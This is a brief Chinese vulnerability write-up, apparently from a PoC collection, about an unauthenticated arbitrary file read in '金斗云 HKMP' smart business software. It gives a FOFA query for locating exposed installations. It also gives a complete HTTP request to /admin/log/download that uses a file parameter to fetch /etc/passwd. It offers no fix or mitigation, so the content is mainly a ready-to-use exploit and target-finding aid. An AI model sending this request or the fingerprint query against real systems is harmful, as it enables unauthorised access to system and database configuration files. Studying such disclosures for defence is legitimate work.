# 金斗云-HKMP智慧商业软件download任意文件读取漏洞

金斗云-HKMP智慧商业软件download任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa

```yaml
body="金斗云 Copyright"
```

## poc

```yaml
GET /admin/log/download?file=/etc/passwd HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

![「漏洞复现」金斗云 HKMP智慧商业软件 download 任意文件读取漏洞](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407122046040.png)